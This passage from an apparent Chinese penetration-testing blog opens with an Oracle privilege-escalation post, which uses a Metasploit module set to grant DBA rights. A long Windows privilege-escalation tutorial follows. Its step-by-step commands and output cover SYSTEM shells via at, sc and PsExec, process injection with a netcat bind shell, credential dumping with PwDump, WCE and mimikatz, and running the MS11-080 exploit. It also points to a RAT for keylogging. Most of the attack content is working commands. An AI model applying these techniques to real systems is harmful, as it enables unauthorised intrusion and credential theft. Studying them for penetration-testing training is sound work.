<pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p>
<pre><code>set dbuser quan

set dbpass quan123

set sid orcl

set rhost xxxxx

set sql grant dba to quan</code></pre><p>3.run</p>
<h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>UTL_HTTP存储过程可用</li>
<li>Oracle9i~11gR2</li>
</ul>
<h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol>
<li>创建Java包</li>
<li>创建存储过程MYJAVACMD</li>
<li>执行存储过程，成功添加用户</li>
</ol>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
]]></content>
  </entry>
  <entry>
    <title>windows中常见提权方式总结</title>
    <url>/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</url>
    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获得更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
<li>系统账号之间权限隔离<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登录时获取权限令牌</li>
<li>服务账号无需用户登录已在后台启动服务</li>
</ul>
</li>
<li>Windows<ul>
<li>users</li>
<li>Administrator</li>
<li>System</li>
</ul>
</li>
</ul>
<h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin *
 C:\Documents and Settings\kevin&gt;net user kevin *
     Type a password for the user:
     Retype the password to confirm:
     The command completed successfully.

 # 查看系统用户：net user
 C:\Documents and Settings\kevin&gt;net user
     User accounts for \\DH-CA8822AB9589
     ---------------------------------------------------------------------
     Administrator            Guest                    HelpAssistant
     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin
     SUPPORT_388945a0
     The command completed successfully.

 # 查看用户状态：
 C:\Documents and Settings\kevin&gt;net user kevin
     User name                    kevin
     Full Name                    kevin
     Comment
     User&#39;s comment
     Country code                 000 (System Default)
     Account active               Yes
     Account expires              Never

     Password last set            2/28/2018 2:05 PM
     Password expires             Never
     Password changeable          2/28/2018 2:05 PM
     Password required            Yes
     User may change password     Yes

     Workstations allowed         All
     Logon script
     User profile
     Home directory
     Last logon                   2/28/2018 2:03 PM

     Logon hours allowed          All

     Local Group Memberships      *Administrators       *Users
     Global Group memberships     *None
     The command completed successfully.
</code></pre><p>1.查看用户进程</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt=""></p>
<p>2.将 administrator 用户权限提升为 system 权限</p>
<pre><code>  C:\Documents and Settings\administrator&gt;cd \
  C:\&gt;at -?
  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间
      Added a new job with job ID = 1
  C:\&gt;at
  Status ID   Day                     Time          Command Line
  ---------------------------------------------------------------------
          1   Today                     2:15 AM       cmd
</code></pre><p>我们看到这里弹出了system权限的命令框</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt=""></p>
<p>3.用新的 system 权限的窗口启动任务管理器</p>
<pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭之前的explorer</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt=""></p>
<p>5.应用程序-&gt;新任务-&gt;explorer</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt=""></p>
<p>6.验证桌面用户权限</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203554.png" alt=""></p>
<h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p>
<pre><code>- C:\Users\root&gt;cd \
- C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact
- C:&gt;sc start syscmd</code></pre><p>3.使用 Sysinternals Suite 套件</p>
<p>推荐书籍 《Windows Internals第7版》</p>
<p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p>
<ul>
<li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205521.png" alt=""></p>
</li>
<li><p>启动 PsExec.exe</p>
</li>
</ul>
<pre><code>  C:\&gt;PsExec.exe
  -i: 交互模式
  -s: 使用系统账户

  C:\&gt;psexec -p&#39;sei -s -d taskmgr
  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul>
<li>提权结果</li>
</ul>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt=""></p>
<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul>
<li>pinjector.exe</li>
</ul>
<p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p>
<ul>
<li>下载之后解压使用其中的 PsExec 放在C盘根目录</li>
</ul>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205858.png" alt=""></p>
<ul>
<li>列出可注入进程及其信息<ul>
<li>C:&gt;pinjector.exe</li>
<li>C:&gt;pinjector.exe -l</li>
</ul>
</li>
<li>找一个未使用端口<ul>
<li>C:&gt;netstat -nao | find “4444” </li>
<li>无结果表示未使用</li>
</ul>
</li>
<li>选择一个进程注入</li>
</ul>
<pre><code>  C:\&gt;pinjector.exe -l
      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM
  C:\&gt;pinjector.exe -p 668 cmd 4444
      Privilege Switcher for Win32(Private version)
      (c) 2006 Andres Tarasco - atarasco@gmail.com
      [+] Trying to execute cmd to 668 as: ? \
      [+] Code inyected... ; )</code></pre><ul>
<li>查看被注入的进程的监听状态</li>
</ul>
<pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;
      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul>
<li>利用此监听端口</li>
</ul>
<pre><code>  root@kali：~# nc -nv 192.168.153.143 4444
      Connection to 10.10.10.128 555 port [tcp/*] succeeded!
      Microsoft Windows XP [?汾 5.1.2600]
      (C) ??????? 1985-2001 Microsoft Corp
  C:\WINDOWS\system32&gt;whoami
      whoami
      SYSTEM</code></pre><ul>
<li>查看进程</li>
</ul>
<pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek</li>
<li>Commview</li>
<li>Sniffpass：抓取密码相关的数据包</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff：抓取密码相关的数据包</li>
</ul>
</li>
</ol>
<h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul>
<li>可以使用木马软件 DarkCometRAT</li>
<li>在控制目标主机之后可以监控键盘记录信息</li>
</ul>
<h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul>
<li>在浏览器查看缓存密码</li>
</ul>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427211834.png" alt=""></p>
<ul>
<li><p>windows 密码恢复工具</p>
<ul>
<li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li>
</ul>
</li>
<li><p>使用 Pwdump 查看 windows 本地登录密码</p>
<ul>
<li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li>
<li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
<li>添加用户</li>
</ul>
<pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add
  C:\Documents and Settings\kevin&gt;net user
      \\ICST-WINATT 的用户帐户
      -------------------------------------------------------------
      Administrator            Guest                    HelpAssistant
      kevin                    SUPPORT_388945a0         test
      user1                    user2
  C:\Documents and Settings\kevin&gt;cd \
  C:\&gt;PwDump.exe localhost
      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::
      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::
      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::
      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.
  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH
</code></pre><ul>
<li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul>
<li>WINDOWS身份认证过程</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul>
<li>windows 内核中保存有密码明文副本，安全机制较低</li>
<li>需要管理员权限</li>
<li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li>
<li>多用户登录目标主机</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>列举登录账号及会话</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -lv
      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul>
<li><p>每隔5秒刷新一次</p>
<ul>
<li>wce-universal.exe -r</li>
</ul>
</li>
<li><p>删除登录会话</p>
<pre><code>  C:\&gt;wce-universal.exe -d 0020B19D
  C:\&gt;wce-universal.exe -lv
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
</code></pre></li>
<li><p>计算密码对应的 HASH 值</p>
</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -g passwd
      Password:   passwd
      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul>
<li>读取内核中的明文密码</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -w
      user1\ICST-WINATT:123456
      user2\ICST-WINATT:123456
      test\ICST-WINATT:123456
      kevin\ICST-WINATT:123456
      NETWORK SERVICE\MSHOME:

  C:\&gt;net user user1 111222
      命令成功完成。
  C:\&gt;wce-universal.exe -w
      user1\ICST-WINATT:123456
      user2\ICST-WINATT:123456
      test\ICST-WINATT:123456
      kevin\ICST-WINATT:123456
      NETWORK SERVICE\MSHOME:
  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul>
<li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li>
</ul>
<pre><code>  C:\&gt;wce-universal.exe -lv
      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      Changing NTLM credentials of logon session 001E5D92h to:
      Username: kevin
      domain: ICST-WINATT
      LMHash: 44EFCE164AB921CAAAD3B435B51404EE
      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4
      NTLM credentials successfully changed!
  C:\&gt;wce-universal.exe -lv
      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul>
<li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p>
<ul>
<li>防范方法：修改注册表</li>
</ul>
<pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul>
<li>删除 wdigest 之后重启计算机</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul>
<li>PwDump localhost<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
</ul>
</li>
<li>fgdump<ul>
<li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul>
<li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li>
</ul>
<pre><code>  C:\Win32&gt;mimikatz.exe
  查看帮助是：：
  mimikatz # ::
              standard  -  Standard module  [Basic commands (does not require module name)]
                crypto  -  Crypto Module
              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
              kerberos  -  Kerberos package module  []
             privilege  -  Privilege module
               process  -  Process module
               service  -  Service module
               lsadump  -  LsaDump module
                    ts  -  Terminal Server module
                 event  -  Event module
                  misc  -  Miscellaneous module
                 token  -  Token manipulation module
                 vault  -  Windows Vault/Credential module
           minesweeper  -  MineSweeper module
                   net  -
                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
             busylight  -  BusyLight Module
                sysenv  -  System Environment Value module
                   sid  -  Security Identifiers module
                   iis  -  IIS XML Config module
                   rpc  -  RPC control of mimikatz            
  mimikatz # privilege::
              Module :        privilege
              Full name :     Privilege module

                 debug  -  Ask debug privilege            * *
                driver  -  Ask load driver privilege
              security  -  Ask security privilege
                   tcb  -  Ask tcb privilege
                backup  -  Ask backup privilege
               restore  -  Ask restore privilege
                sysenv  -  Ask system environment privilege
                    id  -  Ask a privilege by its id
                  name  -  Ask a privilege by its name
  mimikatz # privilege::debug
  mimikatz # sekurlsa::
  mimikatz # sekurlsa::logonPasswords
  mimikatz # sekurlsa::wdigest
  mimikatz # process::list
  mimikatz # lsadump::sam
  mimikatz # lsadump::cache
  mimikatz # ts::multirdp
  mimikatz # event::clear
  mimikatz # event::drop
  mimikatz # misc::regedit
  mimikatz # token::whoami</code></pre><h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
<li><p>Ms011-080 对应补丁 Kb2592799</p>
<p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<pre><code> root@kali:~# searchsploit Ms11-080
     ------------------------------------------ --------------------------------
      Exploit Title                            |  Path
                                               | (/usr/share/exploitdb/)
     ------------------------------------------ --------------------------------
     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb
     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py
     ------------------------------------------ --------------------------------

 root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py .

 # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)
 # 首先查看 WinXP 是否安装了 对应更新 Kb2592799
 WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> 查看 WinXP下的文件路径</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p>
<pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  启动任务管理器</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  结束 kevin 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>  输入 explorer</p>
<p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p>
<p>  启动 system 权限的 explorer 桌面程序</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2.WinXP 无需安装 Pyhon 的运行环境</p>
<pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包
  root@kali:~# apt-get install python-pip
  root@kali:~# pip install pyinstaller
  # 或者 WinXP 下，安装 python2.7
  C:\&gt;pyinstaller --onefile 18176.py
      297 INFO: Building EXE from out00-EXE.toc
      297 INFO: Appending archive to EXE C:\dist\18176.exe
      328 INFO: Building EXE from out00-EXE.toc completed successfully.
</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  # 打开文件目录，将文件复制到目标主机
  C:\&gt;whoami
      test
  C:\&gt;net user test
      本地组成员             *Users
      全局组成员             *None
  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     C:\&gt;cd 111
     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     C:\WINDOWS\system32&gt;whoami
         SYSTEM
     # 将自己添加为管理员组
     C:\WINDOWS\system32&gt;net localgroup administrators test /add
         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
<h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul>
<li><p>使用 win2003 搭建域控制器</p>
<ul>
<li><p>配置并连接域控制器</p>
<ul>
<li>运行 -&gt; dcpromo</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p>
</li>
</ul>
</li>
</ul>
<pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址
     # Win2003 设置强密码
     C:\&gt;net user Administrator jlcssadmin2006...

     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址
     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
<p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p>
<p>重启之后</p>
<p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>修改 Win2003 中的域控制器的用户权限</p>
<ul>
<li>Win2003 -&gt; 运行 -&gt; dsa.msc</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
